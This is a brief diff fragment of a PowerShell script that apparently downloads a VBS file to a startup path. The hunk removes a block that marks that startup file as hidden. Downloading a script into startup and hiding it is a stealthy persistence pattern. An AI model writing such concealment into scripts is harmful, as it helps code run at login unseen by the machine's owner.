@@ -40,15 +40,3 @@ try {
 } catch {
     Write-Host "Failed to download VBS file: $_"
 }
-
-# Hide the VBS file if it exists
-try {
-    if (Test-Path $startupPath) {
-        Set-ItemProperty -Path $startupPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-        Write-Host "VBS file hidden."
-    } else {
-        Write-Host "VBS file not found."
-    }
-} catch {
-    Write-Host "Failed to hide VBS file: $_"
-}
